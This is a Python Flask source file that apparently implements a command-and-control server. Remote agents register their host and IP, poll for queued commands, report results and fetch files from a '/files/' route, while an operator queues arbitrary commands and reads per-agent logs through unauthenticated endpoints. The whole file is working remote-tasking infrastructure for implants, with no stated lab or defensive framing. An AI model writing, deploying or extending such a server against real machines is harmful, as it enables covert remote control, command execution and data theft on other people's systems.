from flask import Flask, request, send_from_directory
import random, json
from datetime import datetime

app = Flask(__name__)

agent_list = []

def printToLog(ip, message):
    print(f"{ip} - - [{datetime.now().strftime('%d/%b/%Y %H:%M:%S')}]", message)

def getAgentByID(id):
    global agent_list
    for agent in agent_list:
        if agent.id == id:
            return agent
    return None

class Agent:
    def __init__(self, ip, host):
        global agent_list
        self.id = self.createID()
        self.ip = ip
        self.host = host
        self.tasks = []
        self.log = []
        agent_list.append(self)
    def createID(self):
        return ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
    def getLog(self):
        if self.log == []:
            return "Agent log is empty."
        else:
            log = ""
            while self.log != []:
                log += self.log.pop(0) + "\n\n"
            return log


@app.route('/reg', methods=['POST'])
def createAgent():
    ip = request.remote_addr
    host = request.form.get("host")
    agent = Agent(ip, host)
    printToLog(ip, f"Agent {agent.id} registered from {host}")
    return (agent.id, 200)

@app.route('/tasks/<id>', methods=['GET'])
def sendTasks(id):
    agent = getAgentByID(id)
    if agent != None:
        if agent.tasks != []:
            task = agent.tasks.pop()
            return (task, 200)
        else:
            return ('', 204)

@app.route('/results/<id>', methods=['POST'])
def getResults(id):
    global agent_list
    result = request.form.get("result").split()
    ip = request.remote_addr
    if result != []:
        if result == ['exit']:
            agent = getAgentByID(id)
            if agent != None:
                agent_list.remove(agent)
        elif result[0] == 'id':
            agent = getAgentByID(id)
            if agent != None:
                agent.id = result[1]
        else:
            agent = getAgentByID(id)
            agent.log.append(" ".join(result))
            printToLog(ip, agent.log)
    return ('', 204)

@app.route('/commands/<cmd>', methods=['GET', 'POST'])
def parseCommand(cmd):
    if cmd == 'agents':
        result = []
        for agent in agent_list:
            result.append({
                'id': agent.id,
                'host': agent.host,
                'ip': agent.ip
            })
        return (json.dumps(result), 200)
    elif cmd == 'send':
        agent = getAgentByID(request.form.get('agent'))
        command = request.form.get('command')
        if agent != None:
            agent.tasks.append(command)
        else:
            return ('Agent not found.', 200)
    elif cmd == 'log':
        agent = getAgentByID(request.form.get('agent'))
        if agent != None:
            log = agent.getLog()
            return (log, 200)
        else:
            return ('Agent not found.', 200)
    return ('', 204)

@app.route('/files/<path:filename>', methods=['GET'])
def serve_file(filename):
    printToLog(request.remote_addr, filename)
    return send_from_directory('files', filename)